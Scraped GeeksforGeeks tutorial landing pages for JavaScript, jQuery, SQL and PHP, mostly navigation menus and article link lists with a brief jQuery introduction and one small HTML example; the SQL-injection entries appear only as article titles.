weakSet.add() with Examples JavaScript | weakSet.has() with Examples JavaScript | weakSet.delete() with Example More>> WeakMap: JavaScript | weakMap.set() with Examples JavaScript | weakMap.get() JavaScript | weakMap.has() with Examples JavaScript | weakMap.delete() More>> p5: p5.js | Introduction p5.js | triangle() Function p5.js | ellipse() Function p5.js | arc() Function p5.js | noStroke() Function p5.js | box() Function More>> Underscore.js: Underscore.js | _.last() with Examples Underscore.js | _.filter() with Examples Underscore.js | _.compact() with Examples Underscore.js | _.flatten() with Examples Underscore.js | _.initial() with Examples Underscore.js | _.rest() with Examples Underscore.js | countBy() with Examples Underscore.js | shuffle() with Examples Underscore.js | each() function Underscore.js | _.without() with Examples Underscore.js | _.size() with Examples Underscore.js | _.zip() with Examples Underscore.js | _.unzip() with Examples Underscore.js | _.intersection() with Examples Underscore.js | _.uniq() with Examples Underscore.js | _.union() with Examples More>> Quick Links: Tutorial on ReactJS Tutorial on Web Technology My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseDesign Twitter - A System Design Interview QuestionTop 40 Python Interview Questions & AnswersProof that Clique Decision problem is NP-Complete | Set 2 Most Visited Articles Difference between List VS Set VS Tuple in Python5 Common System Design Concepts for Interview PreparationWhy non-static variable cannot be referenced from a static method in JavaTop 5 IDEs for C++ That You Should Try OnceCheck whether count of odd and even factors of a number are equal room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

jQuery Tutorials - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ jQuery Basicexpand_morejQuery TutorialsjQuery | IntroductionjQuery | SyntaxjQuery | Selectors and Event MethodsjQuery Selectorsexpand_morejQuery | * SelectorjQuery | #id SelectorJQuery | Multiple ID selectorsjQuery | .class SelectorjQuery | multiple classes SelectorjQuery | element SelectorjQuery | multiple elements SelectorjQuery | :first SelectorjQuery | :last SelectorjQuery | :even SelectorjQuery | :odd SelectorjQuery | :first-child SelectorjQuery | :first-of-type SelectorjQuery | :last-child SelectorjQuery | Selectors Complete ReferencejQuery Eventsexpand_morejQuery | bind() with ExamplesjQuery | blur() with ExamplesjQuery | change() with ExamplesjQuery | click() with ExamplesjQuery | dblclick() with ExamplesjQuery | delegate() MethodjQuery | die() MethodjQuery | error() MethodjQuery | event.currentTarget PropertyjQuery | event.data PropertyjQuery | event.delegateTarget PropertyjQuery | event.isDefaultPrevented() MethodjQuery | event.isImmediatePropagationStopped() MethodjQuery | event.isPropagationStopped() MethodjQuery | Event Methods Complete ReferencejQuery Effectexpand_morejQuery | animate() with ExamplesjQuery | clearQueue() with ExamplesjQuery | delay() with ExamplesjQuery | dequeue() with ExamplesjQuery | fadeIn() MethodjQuery | Effect fadeOut() MethodjQuery | fadeTo() with ExamplesjQuery | fadeToggle() MethodjQuery | finish() with ExamplejQuery | hide() with ExamplesjQuery | queue() with ExamplesjQuery | Effect show() MethodjQuery | slideDown() MethodjQuery | slideToggle() MethodjQuery | Effects Complete ReferencejQuery HTML/CSSexpand_morejQuery | addClass() with ExamplesjQuery | after() with ExamplesjQuery | append() MethodjQuery | appendTo() with ExamplesjQuery | attr() MethodjQuery | before() MethodjQuery | clone() with ExamplesjQuery | css() MethodjQuery | detach() with ExamplesjQuery | empty() with ExamplesjQuery | hasClass() with ExamplesjQuery | height() and innerHeight() with ExamplesjQuery | html() MethodjQuery | innerWidth() with ExamplejQuery | HTML/CSS Methods Complete ReferencejQuery Traversingexpand_morejQuery | add() method with ExamplejQuery | addBack() with ExamplesjQuery | andSelf( ) with ExamplesjQuery | children() with ExamplesjQuery | closest() with ExamplesjQuery | contents() with ExamplesjQuery | eq() with ExamplesjQuery | filter() with ExamplesjQuery | find() with ExamplesjQuery | first() with ExamplesjQuery | has() with ExamplesjQuery | is() MethodjQuery | last() with ExamplesJQuery | map() MethodjQuery | Traversing Complete ReferencejQuery AJAXexpand_morejQuery | ajax() MethodjQuery | ajaxComplete() MethodjQuery | ajaxError() MethodjQuery | ajaxSend() MethodjQuery | ajaxSetup() MethodjQuery | ajaxStart() MethodjQuery | ajaxStop() MethodjQuery | ajaxSuccess() MethodjQuery | get() MethodjQuery | getJSON() MethodJQuery | parseJSON() methodjQuery | getScript() MethodjQuery | param() MethodjQuery | post() MethodjQuery | AJAX Complete ReferencejQuery Propertiesexpand_morejQuery | context PropertyjQuery | jquery PropertyjQuery | jQuery.fx.interval Property with examplejQuery | jQuery.fx.off PropertyjQuery | jQuery.support PropertyjQuery | length propertyjQuery | Properties Complete ReferencejQuery Pluginsexpand_morejQuery Timepicker PluginjQuery bootstrapSelect PluginJavaScript ScrollLoopMenu PluginJavaScript Gallery PluginJavaScript RapidLayersAnimation PluginCSS Stacking Page PluginjQuery Image ProgressBars PluginjQuery jTippy Tooltip PluginjQuery hc-offcanvas-nav PluginjQuery Jcrop PluginjQuery Highcharts PluginjQuery GMaps PluginjQuery | Plugins Complete ReferencejQuery Mobileexpand_moreHow to create a Time Input using jQuery Mobile ?How to create Basic collapsibles using jQuery Mobile ?How to make Icon collapsibles using jQuery Mobile ?How to create Basic flip toggle switch using jQuery Mobile ?How to create Disable flip toggle switch using jQuery Mobile ?How to make Theme collapsibles using jQuery Mobile ?How to create a Week Input using jQuery Mobile ?How to create a Position popup using jQuery Mobile ?How to make a Inline Button using jQuery Mobile ?How to make a Shadow Button using jQuery Mobile ?jQuery Interview Questions & Answersexpand_morejQuery Interview Questions and AnswersjQuery Interview Questions and Answers | Set-2jQuery Interview Questions and Answers | Set-3How to check if an element is hidden in jQuery?How to check whether a checkbox is checked in jQuery?How to know which radio button is selected using jQuery?How to refresh a page using jQuery?What is the correct JSON content type ?How to convert jQuery to JavaScript ?How to create UI Datepicker using jQuery ?How to check a string starts/ends with a specific string in jQuery ?How to convert first letter of a string to upper case using jQuery ?How to select an element with multiple classes using jQuery ? jQuery Tutorials Last Updated: 18-12-2020 Recent Articles on jQuery jQuery is an open source JavaScript library that simplifies the interactions between an HTML/CSS document, or more precisely the Document Object Model (DOM), and JavaScript.Elaborating the terms, jQuery simplifies HTML document traversing and manipulation, browser event handling, DOM animations, Ajax interactions, and cross-browser JavaScript development. Example: <!DOCTYPE html> <html> <head> <script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"> </script> <script> $(document).ready(function () { $("h2").click(function () { $(this).hover(); }); }); </script> </head> <body> <center> <h2 style="color: green;"> GeeksforGeeks </h2> </center> </body> </html> Output: Using jQuery (JS) library on HTML page There are several ways to start using jQuery on your web site. Use the Google-hosted/ Microsoft-hosted content delivery network (CDN) to include a version of jQuery. Download own version of jQuery from jQuery.com and host it on own server or local filesystem. Topic : Basics Events and Selectors Traversing Interview Questions: jQuery Interview Questions and Answers | Set-1 jQuery Interview Questions and Answers | Set-2 jQuery Interview Questions and Answers | Set-3 Complete Reference: jQuery | Selectors Complete Reference jQuery | Event Methods Complete Reference jQuery | Effects Complete Reference jQuery | HTML/CSS Methods Complete Reference jQuery | Traversing Complete Reference jQuery | AJAX Complete Reference jQuery | Properties Complete Reference jQuery | Plugins Complete Reference jQuery Questions Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. My Personal Notes arrow_drop_up Save Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTypes of Environments in AIDesign Twitter - A System Design Interview QuestionTop 40 Python Interview Questions & Answers Most Visited Articles Proof that Clique Decision problem is NP-Complete | Set 2Difference between List VS Set VS Tuple in Python5 Common System Design Concepts for Interview PreparationMajor Kernel Functions in Support Vector Machine (SVM)Why non-static variable cannot be referenced from a static method in Java room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

SQL Tutorial - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Basicsexpand_moreDatabase Management System (DBMS)Introduction of DBMS (Database Management System) | Set 1Introduction of 3-Tier Architecture in DBMS | Set 2DBMS Architecture 2-Level, 3-LevelNeed for DBMSAdvantages of DBMS over File systemEconomic factors (Choice of DBMS)Data Abstraction and Data IndependenceIntroduction of ER ModelRecursive Relationships in ER diagramsMinimization of ER DiagramsEnhanced ER ModelMapping from ER Model to Relational ModelRelational model (relational algebra, tuple calculus)expand_moreRelational Model in DBMSIntroduction of Relational Algebra in DBMSAnomalies in Relational ModelIntroduction of Relational Model and Codd Rules in DBMSTypes of Keys in Relational Model (Candidate, Super, Primary, Alternate and Foreign)Basic Operators in Relational AlgebraExtended Operators in Relational AlgebraTuple Relational Calculus (TRC) in DBMSHow to solve Relational Algebra problems for GATEDifference between Row oriented and Column oriented data stores in DBMSDatabase design (integrity constraints, normal forms)expand_moreIntroduction of Database NormalizationNormal Forms in DBMSFunctional Dependency and Attribute ClosureFinding Attribute Closure and Candidate Keys using Functional DependenciesNumber of possible Superkeys in DBMSLossless Decomposition in DBMSDatabase Management System | Dependency Preserving DecompositionLossless Join and Dependency Preserving DecompositionHow to find the highest normal form of a relationMinimum relations satisfying First Normal Form (1NF)Equivalence of Functional DependenciesArmstrong’s Axioms in Functional Dependency in DBMSCanonical Cover of Functional Dependencies in DBMSDenormalization in DatabasesIntroduction of 4th and 5th Normal form in DBMSQuery languages (SQL)expand_moreStructured Query Language (SQL)Inner Join vs Outer JoinHaving vs Where Clause in SQLDatabase Objects in DBMSNested Queries in SQLJoin operation Vs Nested query in DBMSIndexing in Databases | Set 1SQL queries on clustered and non-clustered IndexesSQL TutorialTransactions and concurrency controlexpand_moreConcurrency Control in DBMSDatabase Recovery Techniques in DBMSACID Properties in DBMSLog based Recovery in DBMSWhy recovery is needed in DBMSTransaction Isolation Levels in DBMSTypes of Schedules in DBMSTypes of Schedules based Recoverability in DBMSConflict Serializability in DBMSPrecedence Graph For Testing Conflict Serializability in DBMSCondition of schedules to View-equivalentRecoverability in DBMSDeadlock in DBMSStarvation in DBMSLock Based Concurrency Control Protocol in DBMSTwo Phase Locking ProtocolCategories of Two Phase Locking (Strict, Rigorous & Conservative)Two Phase Locking (2-PL) Concurrency Control Protocol | Set 3Thomas Write Rule in DBMSTimestamp based Concurrency ControlMultiple Granularity Locking in DBMSGraph Based Concurrency Control Protocol in DBMSIntroduction to TimeStamp and Deadlock Prevention Schemes in DBMSImplementation of Locking in DBMSChallenges of database security in DBMSFile structures (sequential files, indexing, B and B+ trees)expand_moreFile Organization in DBMS | Set 1File Organization in DBMS | Set 2File Organization in DBMS | Set 3Introduction of B-TreeInsert Operation in B-TreeDelete Operation in B-TreeIntroduction of B+ TreeRAID (Redundant Arrays of Independent Disks)Data WarehousingData MiningData Replication in DBMSDBMS Quizexpand_moreDatabase Management Systems | Set 1Database Management Systems | Set 2Database Management Systems | Set 3Database Management Systems | Set 4Database Management Systems | Set 5Database Management Systems | Set 6Database Management Systems | Set 7Database Management Systems | Set 8Database Management Systems | Set 9Database Management Systems | Set 10DBMS GATE Questionsexpand_moreER and Relational ModelsDatabase Design(Normal Forms)SQLTransactions and concurrency controlFile structures (sequential files, indexing, B and B+ trees) SQL Tutorial Structured Query Language or SQL is a standard Database language which is used to create, maintain and retrieve the data from relational databases like MySQL, Oracle, SQL Server, PostGre, etc. The recent ISO standard version of SQL is SQL:2019. As the name suggests, it is used when we have structured data (in the form of tables). All databases that are not relational (or do not use fixed structure tables to store data) and therefore do not use SQL, are called NoSQL databases. Examples of NoSQL are MongoDB, DynamoDB, Cassandra, etc ‘Recent Articles’ on SQL Topic: Basics Clauses / Operators Functions Queries SQL-Injection PL/SQL MySQL SQL Server Misc Quick Links Basics: Structured Query Language SQL | Datatypes SQL | DDL, DML, TCL and DCL SQL | TRANSACTIONS SQL | VIEWS SQL | Comments SQL | Constraints SQL | Creating Roles SQL | Indexes SQL | SEQUENCES SQL | Query Processing CTE in SQL SQL Trigger | Student Database Book Management Database Introduction to NoSQL Clauses / Operators: SQL | WITH clause SQL | With Ties Clause SQL | Arithmetic Operators SQL | Wildcard operators SQL | Intersect & Except clause SQL | USING Clause SQL | MERGE Statement MERGE Statement in SQL Explained SQL | DDL, DML, DCL and TCL Commands SQL | CREATE DOMAIN SQL | DESCRIBE Statement SQL | Case Statement SQL | UNIQUE Constraint SQL | Create Table Extension SQL | ALTER (RENAME) SQL | ALTER (ADD, DROP, MODIFY) SQL | LIMIT Clause SQL | INSERT IGNORE Statement SQL | LIKE SQL | SOME SQL | OFFSET-FETCH Clause SQL | Except Clause Combining aggregate and non-aggregate values in SQL using Joins and Over clause SQL | ALL and ANY SQL | EXISTS SQL | GROUP BY SQL | Union Clause SQL | Aliases SQL | ORDER BY SQL | SELECT TOP Clause SQL | UPDATE Statement SQL | DELETE Statement SQL | INSERT INTO Statement SQL | AND and OR operators SQL | WHERE Clause SQL | Distinct Clause SQL | SELECT Query SQL | DROP, TRUNCATE SQL | CREATE SQL | Join (Cartesian Join & Self Join) SQL | Alternative Quote Operator SQL | Concatenation Operator SQL | MINUS Operator SQL | DIVISION SQL | NOT Operator SQL | BETWEEN & IN Operator SQL | Join (Inner, Left, Right and Full Joins) SQL | CHECK Constraint SQL-Injection: SQL Injection How to use SQLMAP to test a website for SQL Injection vulnerability Mitigation of SQL Injection Attack using Prepared Statements (Parameterized Queries) Basic SQL Injection and Mitigation with Example Functions: SQL | Mathematical functions (SQRT, PI, SQUARE, ROUND, CEILING & FLOOR) SQL | Conversion Function SQL general functions | NVL, NVL2, DECODE, COALESCE, NULLIF, LNNVL and NANVL SQL | Conditional Expressions SQL | Character Functions with Examples SQL | Date Functions (Set-1) SQL | Date Functions (Set-2) SQL | LISTAGG SQL | Aggregate functions SQL | Functions (Aggregate and Scalar Functions) SQL | Date functions SQL | NULL SQL | Numeric Functions SQL | String functions SQL | Advanced Functions Queries: SQL | Joining three or more tables SQL | How to Get the names of the table SQL | Sub queries in From Clause SQL | Correlated Subqueries SQL | Top-N Queries SQL | SUB Queries SQL | How to print duplicate rows in a table? SQL | How to find Nth highest salary from a table DBMS | Nested Queries in SQL SQL query to find second highest salary? PL/SQL: PL/SQL Introduction Cursors in PL/SQL Sum Of Two Numbers in PL/SQL Reverse a number in PL/SQL Factorial of a number in PL/SQL Print Patterns in PL/SQL Decision Making in PL/SQL Oracle SQL | Pseudocolumn SQL | Procedures in PL/SQL Print different star patterns in SQL GCD of two numbers in PL/SQL Centered triangular number in PL/SQL Floyd’s triangle in PL/SQL Convert distance from km to meters and centimeters in PL/SQL Convert the given numbers into words in Pl/SQL Sum of digits of a number in PL/ SQL Sum of digits equal to a given number in PL/SQL Sum and average of three numbers in PL/SQL Check whether a string is palindrome or not in PL/SQL Count odd and even digits in a number in PL/SQL No. of vowels and consonants in a given string in PL/SQL Area and Perimeter of a circle in PL/SQL Finding sum of first n natural numbers in PL/SQL Area and Perimeter of Rectangle in PL/SQL Sum of the first and last digit of a number in PL/SQL Count no. of characters and words in a string in PL/SQL Greatest number among three given numbers in PL/SQL Concatenation of strings in PL/SQL PL/SQL | User Input MySQL: MySQL | Regular expressions(Regexp) MySQL | Grant/Revoke Privileges MySQL | DATABASE() and CURRENT_USER() Functions MySQL | BIN() Function MySQL | IFNULL MySQL | LAST_DAY() Function MySQL | RENAME USER MySQL | DROP USER MySQL | CREATE USER Statement MySQL | Change User Password PHP | MySQL WHERE Clause PHP | MySQL ORDER BY Clause PHP | MySQL UPDATE Query PHP | MySQL Delete Query PHP | MySQL LIMIT Clause PHP | MySQL Select Query PHP | Inserting into MySQL database PHP | MySQL ( Creating Table ) PHP | MySQL ( Creating Database ) SQL Server: SQL SERVER | Conditional Statements SQL Server Identity SQL Server | STUFF() Function Misc: SQL using Python | Set 1 SQL using Python and SQLite | Set 2 SQL using Python | Set 3 (Handling large data) Check if Table, View, Trigger, etc present in Oracle Performing Database Operations in Java | SQL CREATE, INSERT, UPDATE, DELETE and SELECT Difference between Simple and Complex View in SQL Difference between Static and Dynamic SQL Having Vs Where Clause? Inner Join Vs Outer Join Difference between SQL and NoSQL Quick Links: SQL | Subjective Problems SQL | Multiple Choice Questions SQL | Interview Questions SQL Interview Questions | Set 1 SQL Interview Questions | Set 2 SQL | Commonly asked DBMS interview questions | Set 1 SQL | Commonly asked DBMS interview questions | Set 2 My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTypes of Environments in AITop 40 Python Interview Questions & AnswersProof that Clique Decision problem is NP-Complete | Set 2 Most Visited Articles Difference between List VS Set VS Tuple in PythonMajor Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try OnceFibonacci Series Program in JavaScriptHow to send an email from JavaScript ? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

PHP Tutorials - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ PHP Basicsexpand_morePHP TutorialsPHP | IntroductionPHP Full FormHow to set PHP development environment in windows ?LAMP installation and important PHP configurations on UbuntuPHP | Coding StandardsPHP | Basic SyntaxPHP | VariablesPHP | echo and printPHP | Data TypesPHP | StringsPHP | ConstantsPHP | Magic ConstantsPHP | Decision MakingPHP | LoopsPHP | SuperglobalsPHP | Regular ExpressionsPHP Advanceexpand_morePHP | (Include and Require)PHP | Basics of File HandlingPHP | fopen( ) (Function open file or URL)PHP | fread( ) FunctionPHP | fclose( ) FunctionPHP | fwrite( ) FunctionPHP | Uploading FilePHP | CookiesPHP | SessionsPHP | Filter and Filter ConstantImplementing callback in PHPException Handling in PHPPHP Array Functionsexpand_morePHP | ArraysPHP | array() FunctionPHP | array_change_key_case() FunctionPHP | array_chunk() FunctionPHP | array_column() FunctionPHP | array_combine() FunctionPHP | array_count_values() FunctionPHP | array_diff() functionPHP | array_diff_assoc() FunctionPHP | array_diff_key() FunctionPHP | array_diff_uassoc() FunctionPHP | array_diff_ukey() FunctionPHP | array_fill() functionPHP | array_fill_keys() FunctionPHP | array Functions Complete ReferencePHP Calendar Functionsexpand_morePHP | cal_days_in_month( ) FunctionPHP | cal_from_jd() FunctionPHP | cal_info( ) FunctionPHP | cal_to_jd() FunctionPHP | easter_date() FunctionPHP | easter_days() FunctionPHP | frenchtojd() FunctionPHP | gregoriantojd() FunctionPHP | jddayofweek() FunctionPHP | Calendar Functions Complete ReferencePHP Date/Time Functionsexpand_morePHP | Date and TimePHP | checkdate() FunctionPHP | date_create(), date_format(), date_add() FunctionsPHP | date_create_from_format() FunctionPHP | date_date_set() FunctionPHP | date_default_timezone_get() FunctionPHP | date_default_timezone_set() FunctionPHP | date_diff() FunctionPHP | date_get_last_errors() FunctionPHP | date_isodate_set() FunctionPHP | date_modify() FunctionPHP | date_offset_get() FunctionPHP | date_parse_from_format() FunctionPHP | date_parse() FunctionPHP | date_sub() FunctionPHP Directory Functionsexpand_morephp | chdir() FunctionPHP | chroot( ) FunctionPHP | closedir( ) FunctionPHP | dir() FunctionPHP | getcwd( ) FunctionPHP | opendir() FunctionPHP | readdir() FunctionPHP | rewinddir() FunctionPHP | scandir( ) FunctionPHP Errorexpand_morePHP | Types of ErrorsError handling in PHPHow do I get PHP errors to display?PHP Filesystem Functionsexpand_morePHP | basename( ) FunctionPHP | chgrp( ) FunctionPHP | chmod( ) FunctionPHP | chown( ) FunctionPHP | copy( ) FunctionPHP | dirname( ) FunctionPHP | disk_free_space( ) FunctionPHP | disk_total_space( ) FunctionPHP | feof( ) FunctionPHP | fflush( ) FunctionPHP | fgetc( ) FunctionPHP | fgets( ) FunctionPHP | fgetss( ) FunctionPHP | file_exists( ) FunctionPHP | file_get_contents() FunctionPHP | Filesystem Functions Complete ReferencePHP FTP Functionsexpand_morePHP | ftp_alloc() functionPHP | ftp_chdir() functionPHP | ftp_close() functionPHP | ftp_connect() functionPHP | ftp_delete() functionPHP | ftp_exec() functionPHP | ftp_get() functionPHP | ftp_put() functionPHP | ftp_get_option() functionPHP | ftp_login() functionPHP | ftp_mdtm() FunctionPHP | ftp_mkdir() functionPHP JASONexpand_morePHP | json_decode() FunctionPHP | json_encode() FunctionPHP Math Functionsexpand_morePHP | abs() FunctionPHP | acos( ) FunctionPHP | acosh( ) FunctionPHP | asin( ) FunctionPHP | asinh( ) FunctionPHP | atan2( ) FunctionPHP | atan( ) FunctionPHP | atanh( ) FunctionPHP | base_convert( ) Math FunctionPHP | Math Functions Complete ReferencePHP GMP Functionsexpand_morePHP | gmp_abs() FunctionPHP | gmp_add() for adding large numbersPHP | gmp_clrbit() FunctionPHP | gmp_cmp() FunctionPHP | gmp_com() FunctionPHP | gmp_div_q() FunctionPHP | gmp_div_qr() FunctionPHP | gmp_div_r() FunctionPHP | gmp_divexact() FunctionPHP | GMP Functions Complete ReferencePHP MySQLi Functionsexpand_morePHP | MySQL Database IntroductionPHP | mysqli_connect() FunctionPHP | mysqli_close() FunctionPHP | mysqli_real_escape_string() FunctionPHP | mysqli_ping() FunctionPHP | mysqli_fetch_array() FunctionPHP String Functionsexpand_morePHP | addcslashes() FunctionPHP | addslashes() FunctionPHP | bin2hex() FunctionPHP | chop() FunctionPHP | chr() FunctionPHP | chunk_split() FunctionPHP convert_uudecode() FunctionPHP | convert_uuencode() FunctionPHP | count_chars() FunctionPHP | String Functions Complete ReferencePHP Network Functionsexpand_morePHP | checkdnsrr() FunctionPHP | dns_get_record() functionPHP | dns_get_mx() FunctionPHP | dns_check_record() FunctionPHP | gethostbyaddr() functionPHP | gethostbyname() FunctionPHP | gethostnamel() FunctionPHP | gethostname() FunctionPHP | getprotobyname() FunctionPHP | getprotobynumber() FunctionPHP IntlChar Functions expand_morePHP | IntlChar::charAge() FunctionPHP | IntlChar::charDigitValue() FunctionPHP | IntlChar charDirection() FunctionPHP | IntlChar charFromName() FunctionPHP | IntlChar::charMirror() FunctionPHP | IntlChar::charName() FunctionPHP | IntlChar charType() FunctionPHP | IntlChar::chr() FunctionPHP | IntlChar digit() functionPHP | IntlChar Functions Complete ReferencePHP Image Processing and GD Functionsexpand_morePHP | gd_info() FunctionPHP | getimagesize() FunctionPHP | getimagesizefromstring() FunctionPHP | imagealphablending() FunctionPHP | imagearc() FunctionPHP | imagechar() FunctionPHP | imagecharup() FunctionPHP | imagecolorallocate() FunctionPHP | imagecolorallocatealpha() FunctionPHP | Image Processing and GD Functions Complete ReferencePHP Gmagick Functionsexpand_morePHP | Gmagick addImage() FunctionPHP | Gmagick addnoiseimage() FunctionPHP | Gmagick annotateImage() FunctionPHP | Gmagick blurimage() FunctionPHP | Gmagick borderImage() FunctionPHP | Gmagick charcoalimage() FunctionPHP | Gmagick chopimage() FunctionPHP | Gmagick clear() FunctionPHP | Gmagick commentImage() FunctionPHP | Gmagick Functions Complete ReferencePHP Imagick Functionsexpand_morePHP | Imagick adaptiveBlurImage() FunctionPHP | Imagick adaptiveResizeImage() FunctionPHP | Imagick adaptiveSharpenImage() FunctionPHP | Imagick adaptiveThresholdImage() FunctionPHP | Imagick addImage() FunctionPHP | Imagick 